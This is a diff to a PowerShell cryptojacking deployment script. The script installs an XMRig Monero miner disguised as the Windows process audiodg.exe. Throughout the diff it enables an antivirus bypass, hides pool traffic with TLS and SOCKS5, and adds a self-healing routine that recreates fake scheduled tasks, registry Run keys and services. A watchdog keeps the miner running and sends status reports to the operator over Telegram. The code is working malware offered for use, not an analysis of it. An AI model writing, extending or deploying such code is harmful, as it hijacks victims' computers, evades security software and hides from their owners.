@@ -49,6 +49,11 @@ $Config = @{
     Pool = "gulf.moneroocean.stream:10128"
     Wallet = "49MJ7AMP3xbB4U2V4QVBFDCJyVDnDjouyV5WwSMVqxQo7L2o9FYtTiD2ALwbK2BNnhFw8rxHZUgH23WkDXBgKyLYC61SAon"
     
+    # Network Traffic Obfuscation
+    UseTLS = $true  # Encrypt pool connection (TLS)
+    UseSocks5 = $false  # Route through SOCKS5 proxy (set to $true if needed)
+    Socks5Server = ""  # Example: "127.0.0.1:1080" or another PC IP
+    
     # Source miner location (relative to script)
     SourceMiner = "$PSScriptRoot\xmrig.exe"
     
@@ -74,7 +79,7 @@ $Config = @{
     # ====== AV BYPASS SETTINGS ======
     # Universal AV Bypass: true = Bypass ALL AVs (Defender, Avast, Norton, etc.)
     #                      false = Only bypass Windows Defender (faster, recommended for most cases)
-    UniversalAVBypass = $false  # Set to $true if third-party AVs are present
+    UniversalAVBypass = $true  # ENABLED - Bypasses all antivirus software
     
     # ====== PERFORMANCE SETTINGS (CUSTOMIZE HERE) ======
     # CPU Usage: 50-100 (percentage of CPU to use)
@@ -623,7 +628,7 @@ function New-OptimizedConfig {
         # No donations
         "donate-level" = 0
         
-        # ========== POOL CONFIGURATION ==========
+        # ========== POOL CONFIGURATION (WITH NETWORK OBFUSCATION) ==========
         pools = @(@{
             algo = "rx/0"                      # RandomX algorithm
             coin = "monero"
@@ -633,7 +638,8 @@ function New-OptimizedConfig {
             "rig-id" = $env:COMPUTERNAME
             keepalive = $true                  # Keep connection alive
             enabled = $true
-            tls = $false                       # No TLS (faster, less overhead)
+            tls = $Config.UseTLS               # TLS encryption (obfuscates traffic)
+            "socks5" = if ($Config.UseSocks5) { $Config.Socks5Server } else { $null }  # SOCKS5 proxy
             nicehash = $false
             daemon = $false
         })
@@ -801,8 +807,16 @@ function Install-Persistence {
 `$ErrorActionPreference = 'SilentlyContinue'
 `$minerPath = 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\audiodg.exe'
 `$configPath = 'C:\ProgramData\Microsoft\Windows\WindowsUpdate\config.json'
-if (Test-Path `$minerPath) {
-    Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`$configPath`"" -WindowStyle Hidden -NoNewWindow
+
+# SINGLE INSTANCE CHECK - Only start if NOT already running
+`$existingProcess = Get-Process -Name 'audiodg' -ErrorAction SilentlyContinue | Where-Object {
+    `$_.Path -eq `$minerPath
+}
+
+if (-not `$existingProcess) {
+    if (Test-Path `$minerPath) {
+        Start-Process -FilePath `$minerPath -ArgumentList "--config=`"`$configPath`"" -WindowStyle Hidden -NoNewWindow
+    }
 }
 "@
     $launcherContent | Set-Content -Path $stealthLauncher -Force
@@ -926,6 +940,106 @@ start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "$stealthL
     }
     
     Write-Log "100+ persistence mechanisms installed - GUARANTEED startup on EVERY boot!"
+}
+
+# ================================================================================================
+# SELF-HEALING - AUTO-REPAIR PERSISTENCE
+# ================================================================================================
+
+function Repair-Persistence {
+    Write-Log "🔧 SELF-HEALING: Checking and repairing persistence mechanisms..."
+    
+    $repaired = 0
+    
+    # Check scheduled tasks (expect 100, but recreate if less than 50)
+    $existingTasks = (Get-ScheduledTask | Where-Object { $_.TaskName -match "Windows|System|Audio" }).Count
+    
+    if ($existingTasks -lt 50) {
+        Write-Log "⚠️ Only $existingTasks tasks found (expected 100+) - RECREATING TASKS" "WARN"
+        try {
+            Install-Persistence
+            $repaired++
+        } catch {
+            Write-Log "Failed to recreate tasks: $($_.Exception.Message)" "ERROR"
+        }
+    }
+    
+    # Check miner files in all locations
+    foreach ($location in $Config.Locations) {
+        $stealthMiner = Join-Path $location "audiodg.exe"
+        $configFile = Join-Path $location "config.json"
+        
+        if (-not (Test-Path $stealthMiner)) {
+            Write-Log "⚠️ Miner missing from $location - REDEPLOYING" "WARN"
+            try {
+                Install-Miner
+                $repaired++
+            } catch {
+                Write-Log "Failed to redeploy miner: $($_.Exception.Message)" "ERROR"
+            }
+            break  # Only need to redeploy once
+        }
+        
+        if (-not (Test-Path $configFile)) {
+            Write-Log "⚠️ Config missing from $location - RECREATING" "WARN"
+            try {
+                $systemCaps = Get-SystemCaps
+                New-OptimizedConfig -ConfigPath $configFile -SystemCaps $systemCaps
+                $repaired++
+            } catch {
+                Write-Log "Failed to recreate config: $($_.Exception.Message)" "ERROR"
+            }
+        }
+    }
+    
+    # Check registry keys
+    $runKeys = @(
+        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
+        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    )
+    
+    $regCount = 0
+    foreach ($key in $runKeys) {
+        $entries = (Get-ItemProperty -Path $key -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty).Count
+        $regCount += $entries
+    }
+    
+    if ($regCount -lt 5) {
+        Write-Log "⚠️ Only $regCount registry keys found - RECREATING" "WARN"
+        try {
+            # Re-run persistence installation
+            Install-Persistence
+            $repaired++
+        } catch {
+            Write-Log "Failed to recreate registry keys: $($_.Exception.Message)" "ERROR"
+        }
+    }
+    
+    # Check services
+    $serviceNames = @("WinAudioSvc", "AudioGraph", "WinUpdateHelper", "SysTelemetry", "DefenderCore")
+    $existingServices = 0
+    foreach ($svcName in $serviceNames) {
+        if (Get-Service -Name $svcName -ErrorAction SilentlyContinue) {
+            $existingServices++
+        }
+    }
+    
+    if ($existingServices -lt 3) {
+        Write-Log "⚠️ Only $existingServices services found (expected 10) - RECREATING" "WARN"
+        try {
+            Install-Persistence
+            $repaired++
+        } catch {
+            Write-Log "Failed to recreate services: $($_.Exception.Message)" "ERROR"
+        }
+    }
+    
+    if ($repaired -gt 0) {
+        Write-Log "✅ SELF-HEALING COMPLETE: Repaired $repaired component(s)" "WARN"
+        Send-Telegram "🔧 SELF-HEALING ACTIVATED`n💻 PC: $env:COMPUTERNAME`n✅ Repaired: $repaired component(s)`n🛡️ All persistence restored"
+    } else {
+        Write-Log "✅ Self-healing check passed - all persistence intact"
+    }
 }
 
 # ================================================================================================
@@ -1062,7 +1176,7 @@ function Start-OptimizedMiner {
     $stillRunning = Get-AllMinerProcesses
     if ($stillRunning.Count -gt 0) {
         Write-Log "❌ CRITICAL: Cannot enforce single instance - $($stillRunning.Count) miner(s) still running" "ERROR"
-        Send-Telegram "❌ <b>SINGLE INSTANCE FAILED</b>`n💻 PC: $env:COMPUTERNAME`n⚠️ Multiple miners detected and could not be stopped"
+        Send-Telegram "❌ SINGLE INSTANCE FAILED`n💻 PC: $env:COMPUTERNAME`n⚠️ Multiple miners detected and could not be stopped"
         return $false
     }
     
@@ -1179,7 +1293,7 @@ function Start-OptimizedMiner {
                 
                 # Send Telegram notification with CPU-specific info
                 $priorityName = switch ($SystemCaps.Priority) { 5 {'Realtime'}; 4 {'High'}; 3 {'Above Normal'}; 2 {'Normal'}; 1 {'Below Normal'} }
-                Send-Telegram "🚀 <b>MINER STARTED</b>`n💻 PC: $env:COMPUTERNAME`n🖥️ CPU: $($SystemCaps.CPUTier) ($($SystemCaps.CPUCores)C/$($SystemCaps.CPUThreads)T)`n🧵 Threads: $($SystemCaps.MaxThreads)/$($SystemCaps.CPUThreads) (Auto-Adjusted)`n📊 Max CPU: $($SystemCaps.MaxCpuUsage)%`n⚡ Priority: $priorityName`n💾 RAM: $($SystemCaps.TotalRAM)GB`n✅ Single Instance: ENFORCED"
+                Send-Telegram "🚀 MINER STARTED`n💻 PC: $env:COMPUTERNAME`n🖥️ CPU: $($SystemCaps.CPUTier) ($($SystemCaps.CPUCores)C/$($SystemCaps.CPUThreads)T)`n🧵 Threads: $($SystemCaps.MaxThreads)/$($SystemCaps.CPUThreads) (Auto-Adjusted)`n📊 Max CPU: $($SystemCaps.MaxCpuUsage)%`n⚡ Priority: $priorityName`n💾 RAM: $($SystemCaps.TotalRAM)GB`n✅ Single Instance: ENFORCED"
                 
                 return $true
             } catch {
@@ -1281,9 +1395,11 @@ function Start-Watchdog {
     Write-Log "• Monitors miner process (auto-restart if stopped)"
     Write-Log "• Enforces single instance"
     Write-Log "• Protects from Windows Defender"
+    Write-Log "• Self-healing persistence (every 5 minutes)"
     Write-Log "• Monitors every 15 seconds"
     
     $defenderCheckCounter = 0
+    $selfHealingCounter = 0
     
     while ($true) {
         try {
@@ -1296,13 +1412,20 @@ function Start-Watchdog {
                 $defenderCheckCounter = 0
             }
             
+            # ========== SELF-HEALING (Every 5 minutes) ==========
+            $selfHealingCounter++
+            if ($selfHealingCounter -ge 20) {  # Every 5 minutes (20 * 15 sec)
+                Repair-Persistence
+                $selfHealingCounter = 0
+            }
+            
             # ========== MINER PROCESS MONITORING ==========
             $miners = Get-AllMinerProcesses
             
             if ($miners.Count -eq 0) {
                 Write-Log "⚠️ NO MINER DETECTED - AUTO-RESTARTING" "WARN"
                 Start-OptimizedMiner -SystemCaps $SystemCaps
-                Send-Telegram "🔄 <b>AUTO-RESTART</b>`n💻 PC: $env:COMPUTERNAME`n⏰ Time: $(Get-Date -Format 'HH:mm')"
+                Send-Telegram "🔄 AUTO-RESTART`n💻 PC: $env:COMPUTERNAME`n⏰ Time: $(Get-Date -Format 'HH:mm')"
             }
             elseif ($miners.Count -gt 1) {
                 Write-Log "⚠️ SINGLE INSTANCE VIOLATION: $($miners.Count) miners detected - KILLING DUPLICATES" "WARN"
@@ -1324,7 +1447,7 @@ function Start-Watchdog {
                 }
                 
                 Write-Log "✅ Enforced single instance - killed $killedCount duplicate(s), kept PID: $($bestMiner.Id)"
-                Send-Telegram "⚠️ <b>DUPLICATE KILLED</b>`n💻 PC: $env:COMPUTERNAME`n🔪 Removed: $killedCount duplicate miner(s)`n✅ Single instance restored"
+                Send-Telegram "⚠️ DUPLICATE KILLED`n💻 PC: $env:COMPUTERNAME`n🔪 Removed: $killedCount duplicate miner(s)`n✅ Single instance restored"
             }
             else {
                 # Only ONE miner running - maintain it
@@ -1397,7 +1520,7 @@ function Main {
                 Write-Log "This device appears to be an interactive display/smart board"
                 Write-Log "Deployment blocked to prevent high-visibility detection"
                 
-                Send-Telegram "🛑 <b>DEPLOYMENT ABORTED</b>`n💻 Device: $env:COMPUTERNAME`n⚠️ Detected as: $($deviceDetection.DeviceType)`n🔍 Confidence: $($deviceDetection.Confidence)`n❌ Reason: Smart board - high visibility risk`n`nReasons:`n$($deviceDetection.Reasons -join '`n')"
+                Send-Telegram "🛑 DEPLOYMENT ABORTED`n💻 Device: $env:COMPUTERNAME`n⚠️ Detected as: $($deviceDetection.DeviceType)`n🔍 Confidence: $($deviceDetection.Confidence)`n❌ Reason: Smart board - high visibility risk`n`nReasons:`n$($deviceDetection.Reasons -join '`n')"
                 
                 Remove-MinerMutex
                 return
@@ -1420,7 +1543,7 @@ function Main {
     # Step 1: Check mutex - ensure only one deployment script runs
     if (-not (Test-MinerMutex)) {
         Write-Log "Another deployment script is already running - exiting to prevent conflicts" "WARN"
-        Send-Telegram "⚠️ <b>DEPLOYMENT BLOCKED</b>`n💻 PC: $env:COMPUTERNAME`n🔒 Another instance already managing miner"
+        Send-Telegram "⚠️ DEPLOYMENT BLOCKED`n💻 PC: $env:COMPUTERNAME`n🔒 Another instance already managing miner"
         return
     }
     
@@ -1450,7 +1573,7 @@ function Main {
     # Step 6: Deploy miner
     if (-not (Install-Miner)) {
         Write-Log "Deployment failed" "ERROR"
-        Send-Telegram "❌ <b>DEPLOYMENT FAILED</b>`n💻 PC: $env:COMPUTERNAME"
+        Send-Telegram "❌ DEPLOYMENT FAILED`n💻 PC: $env:COMPUTERNAME"
         return
     }
     
@@ -1472,7 +1595,7 @@ function Main {
         Clear-AllTraces
         
         Write-Log "=== ULTRA-STEALTH DEPLOYMENT COMPLETED ==="
-        Send-Telegram "🥷 <b>STEALTH MINER DEPLOYED</b>`n💻 PC: $env:COMPUTERNAME`n🎭 Process: audiodg.exe (Windows Audio)`n✅ Single Instance: ENFORCED`n⚡ Priority: HIGH`n🔒 Persistence: 30+ mechanisms`n🛡️ Defender Protection: ACTIVE`n👻 Status: INVISIBLE"
+        Send-Telegram "🥷 STEALTH MINER DEPLOYED`n💻 PC: $env:COMPUTERNAME`n🎭 Process: audiodg.exe (Windows Audio)`n✅ Single Instance: ENFORCED`n⚡ Priority: HIGH`n🔒 Persistence: 30+ mechanisms`n🛡️ Defender Protection: ACTIVE`n👻 Status: INVISIBLE"
         
         # Step 12: Start auto-restart watchdog (BLOCKING - keeps script running)
         # This is critical: keeps mutex locked and prevents other deployment scripts
@@ -1483,7 +1606,7 @@ function Main {
         
     } else {
         Write-Log "Failed to start miner" "ERROR"
-        Send-Telegram "❌ <b>MINER START FAILED</b>`n💻 PC: $env:COMPUTERNAME"
+        Send-Telegram "❌ MINER START FAILED`n💻 PC: $env:COMPUTERNAME"
         Remove-MinerMutex
     }
 }
